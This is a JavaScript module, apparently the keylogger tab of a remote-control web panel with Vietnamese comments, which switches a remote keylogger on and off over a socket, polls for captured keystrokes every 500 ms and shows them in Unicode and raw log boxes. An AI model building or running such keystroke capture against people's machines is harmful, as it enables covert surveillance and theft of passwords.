// modules/tab-keylog.js
import { store } from "./store.js";
import { sendCommand } from "./socket.js";
import { logActionUI, showConfirm } from "./ui.js";

export function handleKeylogData(payload) {
  const chk = document.getElementById("chkKeylog");
  if (chk) chk.checked = payload.enabled;

  // Xử lý LOG UNICODE (Khung trên)
  if (payload.display) {
    let areaDisplay = document.getElementById("logUnicode");
    if (areaDisplay) {
      areaDisplay.value += payload.display;
      areaDisplay.scrollTop = areaDisplay.scrollHeight;
    }
  }

  // Xử lý LOG RAW (Khung dưới)
  if (payload.raw) {
    let areaRaw = document.getElementById("logRaw");
    if (areaRaw) {
      areaRaw.value += payload.raw;
      areaRaw.scrollTop = areaRaw.scrollHeight;
    }
  }
}

export function loadKeylog() {
  sendCommand("GET_KEYLOG");
}

export function toggleKeylog(cb) {
  sendCommand("KEYLOG_SET", cb.checked);
  logActionUI(`Keylog: ${cb.checked ? "BẬT" : "TẮT"}`, true);

  if (cb.checked) {
    if (!store.keylogInt)
      store.keylogInt = setInterval(() => {
        sendCommand("GET_KEYLOG");
      }, 500); // Tăng lên 500ms cho đỡ spam
  } else {
    if (store.keylogInt) {
      clearInterval(store.keylogInt);
      store.keylogInt = null;
    }
  }
}

export function clearLogs() {
  showConfirm("Xóa nhật ký bàn phím (Client)?", () => {
    document.getElementById("logUnicode").value = "";
    document.getElementById("logRaw").value = "";
    logActionUI("Đã xóa log phím", true);
  });
}
